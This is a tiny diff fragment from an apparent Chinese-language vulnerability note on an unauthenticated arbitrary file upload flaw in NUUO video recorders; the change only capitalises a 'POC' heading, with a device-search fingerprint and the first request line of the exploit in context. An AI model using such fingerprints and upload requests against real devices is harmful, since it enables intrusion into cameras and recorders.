@@ -8,7 +8,7 @@ NUUO网络视频录像机upload.php任意文件上传漏洞，未经身份验证
 body="www.nuuo.com/eHelpdesk.php"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /upload.php HTTP/1.1
